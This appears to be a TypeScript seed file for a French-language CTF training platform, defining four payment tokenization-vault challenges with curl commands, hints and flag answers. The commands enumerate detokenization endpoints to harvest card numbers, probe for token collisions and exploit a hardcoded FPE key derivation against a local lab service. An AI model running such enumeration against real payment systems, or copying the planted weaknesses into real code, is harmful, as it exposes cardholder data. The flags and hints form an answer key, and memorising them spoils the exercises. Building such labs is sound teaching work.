import type { CtfChallengeSeed } from '../ctfChallenges';

const s = (n: number, t: string, d: string, type: 'CURL_COMMAND' | 'ANALYSIS' | 'EXPLOITATION' | 'CODE_SNIPPET' | 'EXPLANATION' | 'OBSERVATION', cmd?: string, exp?: string, hint?: string): any => ({ stepNumber: n, stepTitle: t, stepDescription: d, stepType: type, ...(cmd && { commandTemplate: cmd }), ...(exp && { expectedOutput: exp }), ...(hint && { hintText: hint }) });
const h = (n: number, t: string, c: number): any => ({ hintNumber: n, hintText: t, costPoints: c });

export const TOKEN_CHALLENGES: CtfChallengeSeed[] = [
    {
        code: 'TOKEN-001', title: 'Le Vault Bavard', description: 'Le vault de tokenisation retourne des fragments de PAN dans ses messages d erreur quand une requete est malformee.', freeModeDescription: 'Envoyez des requetes invalides au vault et analysez les messages d erreur pour extraire des fragments de PAN.',
        category: 'TOKEN_VAULT', difficulty: 'BEGINNER', points: 120, flagValue: 'PMP{TOKEN_VAULT_ERROR_LEAK}',
        targetService: 'api-gateway', targetEndpoint: 'POST http://api-gateway:8000/api/tokenization/detokenize',
        vulnerabilityType: 'Error-based information disclosure', attackVector: 'Malformed request error harvesting',
        learningObjectives: ['Identifier les fuites d information dans les erreurs', 'Techniques d extraction via messages d erreur', 'Securiser les reponses d erreur en production'],
        estimatedMinutes: 15, isActive: true, relatedWorkshopPath: '/student/cursus',
        guidedSteps: [
            s(1, 'Requete valide', 'Envoyez une requete de detokenisation valide pour reference.', 'CURL_COMMAND', 'curl -s -X POST http://api-gateway:8000/api/tokenization/detokenize -H "Content-Type: application/json" -d "{\\"token\\":\\"TKN_000001\\"}" | jq .', 'Reponse avec PAN masque ou 403'),
            s(2, 'Requete malformee', 'Envoyez un token invalide et observez le message d erreur.', 'CURL_COMMAND', 'curl -s -X POST http://api-gateway:8000/api/tokenization/detokenize -H "Content-Type: application/json" -d "{\\"token\\":\\"INVALID_TOKEN_000\\"}" | jq .', 'Message d erreur avec fragment de PAN ou stack trace'),
            s(3, 'Extraction systematique', 'Les messages d erreur revelent des fragments de PAN. En variant les inputs, on peut reconstituer le PAN.', 'ANALYSIS'),
                s(4, 'Capture du flag', 'Fuite d info dans les erreurs du vault.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Envoyez des tokens malformes et lisez attentivement les messages d erreur.', 5), h(2, 'Les erreurs contiennent des references au PAN reel lors du lookup.', 10), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'TOKEN-002', title: 'La Collision de Tokens', description: 'L algorithme de tokenisation genere des collisions : deux PAN differents peuvent produire le meme token.', freeModeDescription: 'Generez des tokens pour differents PAN et cherchez des collisions.',
        category: 'TOKEN_VAULT', difficulty: 'INTERMEDIATE', points: 180, flagValue: 'PMP{TOKEN_COLLISION_DETECTED}',
        prerequisiteChallengeCode: 'TOKEN-001',
        targetService: 'api-gateway', targetEndpoint: 'POST http://api-gateway:8000/api/tokenization/tokenize',
        vulnerabilityType: 'Hash collision in tokenization', attackVector: 'Birthday attack on token space',
        learningObjectives: ['Comprendre les collisions de hash', 'Birthday paradox applique a la tokenisation', 'Impact d une collision sur la securite des paiements'],
        estimatedMinutes: 25, isActive: true, relatedWorkshopPath: '/student/cursus',
        guidedSteps: [
            s(1, 'Generation de tokens', 'Tokenisez 50 PAN differents et collectez les tokens produits.', 'CURL_COMMAND', 'for i in $(seq 1000 1050); do pan="411111111111$i"; echo -n "$pan -> "; curl -s -X POST http://api-gateway:8000/api/tokenization/tokenize -H "Content-Type: application/json" -d "{\\"pan\\":\\"$pan\\"}" | jq -r .token; done', 'Liste de paires PAN -> token'),
            s(2, 'Detection de collisions', 'Triez les tokens et cherchez les doublons.', 'CURL_COMMAND', 'for i in $(seq 1000 1100); do pan="411111111111$i"; curl -s -X POST http://api-gateway:8000/api/tokenization/tokenize -H "Content-Type: application/json" -d "{\\"pan\\":\\"$pan\\"}" | jq -r .token; done | sort | uniq -d', 'Token en double = collision !'),
            s(3, 'Impact', 'Si deux PAN partagent un token, une detokenisation retourne le mauvais PAN. Impact : paiement debite sur le mauvais compte.', 'ANALYSIS'),
            s(4, 'Capture du flag', 'Collision detectee dans la tokenisation.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Generez beaucoup de tokens et cherchez des doublons.', 5), h(2, 'L espace de tokens est trop petit. Des collisions apparaissent rapidement (birthday paradox).', 10), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'TOKEN-003', title: 'Le Detokeniseur', description: 'L endpoint de detokenisation n a pas de rate-limiting. Un attaquant peut enumerer tous les tokens et recuperer les PAN.', freeModeDescription: 'Brute-forcez l espace des tokens pour detokeniser les PAN en masse.',
        category: 'TOKEN_VAULT', difficulty: 'ADVANCED', points: 250, flagValue: 'PMP{DETOKENIZE_NO_RATELIMIT}',
        prerequisiteChallengeCode: 'TOKEN-002',
        targetService: 'api-gateway', targetEndpoint: 'POST http://api-gateway:8000/api/tokenization/detokenize',
        vulnerabilityType: 'Missing rate-limit on detokenization', attackVector: 'Token enumeration brute-force',
        learningObjectives: ['Identifier l absence de rate-limiting', 'Enumerer un espace de tokens', 'Proposer des defenses anti-enumeration'],
        estimatedMinutes: 30, isActive: true, relatedWorkshopPath: '/student/cursus',
        guidedSteps: [
            s(1, 'Enumeration', 'Envoyez 100 requetes de detokenisation en rafale.', 'CURL_COMMAND', 'for i in $(seq 1 100); do token=$(printf "TKN_%06d" $i); echo -n "$token: "; curl -s -X POST http://api-gateway:8000/api/tokenization/detokenize -H "Content-Type: application/json" -d "{\\"token\\":\\"$token\\"}" | jq -r ".pan // \\"not_found\\""; done | grep -v not_found', 'PAN recuperes sans blocage'),
            s(2, 'Verification absence rate-limit', 'Aucune erreur 429. Toutes les requetes passent.', 'ANALYSIS'),
            s(3, 'Acceleration', 'Avec un script parallele, un attaquant peut detokeniser des millions de tokens.', 'ANALYSIS'),
            s(4, 'Capture du flag', 'Pas de rate-limit sur detokenisation.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Essayez TKN_000001, TKN_000002, etc. en rafale. Y a-t-il un blocage ?', 5), h(2, 'Pas de rate-limit. Chaque requete retourne le PAN si le token existe.', 15), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'TOKEN-004', title: 'Le Token Reversible', description: 'L algorithme FPE (Format-Preserving Encryption) utilise une cle derivee de facon previsible. Le token peut etre reverse-engineere pour retrouver le PAN.', freeModeDescription: 'Observez le comportement tokenize/detokenize en blackbox. La cle FPE est derivee d une seed previsible. Reversez le token pour obtenir le PAN.',
        category: 'TOKEN_VAULT', difficulty: 'EXPERT', points: 350, flagValue: 'PMP{FPE_KEY_DERIVATION_WEAK}',
        prerequisiteChallengeCode: 'TOKEN-003',
        targetService: 'api-gateway', targetEndpoint: '/api/tokenization/tokenize + /api/tokenization/detokenize',
        vulnerabilityType: 'Weak key derivation for FPE', attackVector: 'Cryptanalysis of token algorithm',
        learningObjectives: ['Comprendre le FPE (FF1/FF3)', 'Analyser la derivation de cle', 'Exploiter une seed previsible pour inverser la tokenisation'],
        estimatedMinutes: 40, isActive: true, relatedWorkshopPath: '/student/cursus',
        guidedSteps: [
            s(1, 'Audit blackbox', 'Observez le comportement de tokenisation sans acces au code source.', 'CURL_COMMAND', 'token=$(curl -s -X POST http://api-gateway:8000/api/tokenization/tokenize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\"}" | jq -r .token); echo "token=$token"; curl -s -X POST http://api-gateway:8000/api/tokenization/detokenize -H "Content-Type: application/json" -d "{\\"token\\":\\"$token\\"}" | jq .'),
            s(2, 'Derivation de cle', 'La cle FPE est derivee d une seed fixe ou previsible (ex: SHA256 de "tokenization_key").', 'ANALYSIS', undefined, undefined, 'Cherchez d ou vient la cle de chiffrement.'),
            s(3, 'Reverse du token', 'Avec la cle connue, appliquez le dechiffrement FPE pour retrouver le PAN original.', 'EXPLOITATION'),
            s(4, 'Impact', 'Toute la base de tokens peut etre inversee. Impact = fuite massive de PAN.', 'ANALYSIS'),
            s(5, 'Capture du flag', 'Derivation de cle FPE faible.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Cherchez comment la cle FPE est generee. Est-elle hardcodee ou derivee d une seed fixe ?', 5), h(2, 'La cle est SHA256("tokenization_key") — completement previsible.', 15), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
];


